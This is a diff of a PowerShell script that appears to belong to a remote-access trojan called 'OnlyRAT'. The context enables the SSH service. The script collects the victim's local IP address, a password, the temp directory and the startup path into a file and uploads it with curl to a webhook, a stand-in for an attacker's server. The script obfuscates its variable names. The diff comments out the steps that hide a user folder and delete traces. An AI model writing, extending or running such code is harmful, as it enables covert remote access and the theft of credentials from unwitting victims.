@@ -43,20 +43,21 @@ Set-Service -Name sshd -StartupType 'Automatic'
 $CRYnrkaDbe = "$env:UserName.rat"
 $AhdjktGyiZ = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress
 
-Add-Content -Path $CRYnrkaDbe -Value $AhdjktGyiZ # local ip addr
-Add-Content -Path $CRYnrkaDbe -Value $DCilJFugpP # pass
-Add-Content -Path $CRYnrkaDbe -Value $env:temp # temp
-Add-Content -Path $CRYnrkaDbe -Value $pwd # startup
-Add-Content -Path $CRYnrkaDbe -Value "N/A" # remote host
-Add-Content -Path $CRYnrkaDbe -Value "N/A" # remote port
-Add-Content -Path $CRYnrkaDbe -Value 'local' # connection type
+New-Item -Path $CRYnrkaDbe -Force
+Add-Content -Path $CRYnrkaDbe -Value $AhdjktGyiZ -Force # local ip addr
+Add-Content -Path $CRYnrkaDbe -Value $DCilJFugpP -Force # pass
+Add-Content -Path $CRYnrkaDbe -Value $env:temp -Force # temp
+Add-Content -Path $CRYnrkaDbe -Value $pwd -Force # startup
+Add-Content -Path $CRYnrkaDbe -Value "N/A" -Force # remote host
+Add-Content -Path $CRYnrkaDbe -Value "N/A" -Force # remote port
+Add-Content -Path $CRYnrkaDbe -Value 'local' -Force # connection type
 
 # send file to webhook
 $PEBgxuJUfd = Get-Content lawFvVTikZ.txt | Out-String
 Invoke-Expression "curl.exe -F `"payload_json={\```"username\```": \```"onlyrat\```", \```"content\```": \```"download me\```"}`" -F ```"file=@$env:username.rat```" $PEBgxuJUfd"
 
 # cleanup
-attrib +h +s +r C:/Users/onlyrat 
-Remove-Item $CRYnrkaDbe
-Remove-Item lawFvVTikZ.txt
-Remove-Item KFPGaEYdcz.ps1
+#attrib +h +s +r C:/Users/onlyrat 
+#Remove-Item $CRYnrkaDbe
+#Remove-Item lawFvVTikZ.txt
+#Remove-Item KFPGaEYdcz.ps1
